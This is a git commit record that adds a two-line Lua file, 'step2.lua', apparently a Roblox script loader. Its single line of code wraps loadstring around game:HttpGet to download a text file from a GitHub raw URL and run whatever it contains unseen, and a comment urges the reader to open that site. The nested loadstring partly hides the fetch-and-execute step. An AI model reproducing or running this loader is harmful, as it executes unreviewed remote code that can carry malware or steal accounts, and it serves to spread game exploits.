dabe066d7913d004cadb0f95af4ce59cac5f7136
0xdeczi <fenvironment@protonmail.com>
2026-06-16 16:17:49 +0300

    Create step2.lua

---
+++ purpleghost/step2.lua
@@ -0,0 +1,2 @@
+loadstring"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ohio99z/Flameso/refs/heads/main/Mutationsuldate.txt\", true))()"()
+--https://raw.githubusercontent.com/ohio99z/Flameso/refs/heads/main/Mutationsuldate.txt open this websait
